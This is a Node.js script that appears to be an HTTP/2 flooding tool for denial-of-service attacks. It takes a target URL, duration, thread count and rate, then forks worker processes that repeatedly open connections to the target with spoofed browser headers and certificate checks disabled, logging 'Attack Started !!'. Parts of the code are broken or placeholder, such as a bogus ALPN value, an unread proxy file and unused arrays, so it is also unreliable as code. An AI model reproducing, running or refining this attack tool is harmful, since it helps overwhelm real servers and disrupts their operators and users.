const http2 = require('http2');
const https = require('https');
const { URL } = require('url');
const fs = require('fs');
const cluster = require('cluster');
const fakeUserAgent = require('fake-useragent');

const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxyfile = process.argv[6];

const parsedTarget = new URL(target);

const acceptHeaders = ['text/html', 'application/xhtml+xml', 'application/xml;q=0.9', 'image/webp', 'image/apng', 'image/*,*/*;q=0.8', 'application/signed-exchange;v=b3;q=0.9'];
const mozillaVersions = Array.from({ length: 5 }, (_, i) => `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/9${i}.0.3945.130 Safari/537.36`);

const cplist = [];
const sigals = [];

const tlsOptions = {
  secure: true,
  alpnProtocol: 'sigals',
  ciphers: 'ecdhe_ecdsa_with_aes_128_gcm_sha256',
  ecdhCurve: 'auto',
  host: parsedTarget.host,
  rejectUnauthorized: false,
  servername: parsedTarget.host,
  secureProtocol: 'TLS_method'
};

const headers = {
  'User-Agent': fakeUserAgent(),
  'Accept': acceptHeaders.join(','),
  'Connection': 'keep-alive',
  'Cache-Control': 'no-cache',
  'Pragma': 'no-cache',
  'Accept-Encoding': 'gzip, deflate, br',
  'Accept-Language': 'en-US,en;q=0.9',
  'DNT': '1',
  'Upgrade-Insecure-Requests': '1'
};

const payload = Buffer.from('streamIdlengthtypeflagspayload');

function attack() {
  const client = http2.connect(target, tlsOptions);
  const stream = client.request({
    [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
    [http2.constants.HTTP2_HEADER_PATH]: '/',
    [http2.constants.HTTP2_HEADER_HOST]: parsedTarget.host,
    ...headers
  });
  stream.on('response', (headers) => {
    // Do something with the response headers
  });
  stream.write(payload);
  stream.end();
}

if (cluster.isMaster) {
  console.log('Attack Started !!');
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
} else {
  setInterval(attack, ratelimit);
}

if (cluster.isMaster) {
  setTimeout(() => {
    console.log('Attack Completed !!');
    process.exit(0);
  }, time);
}
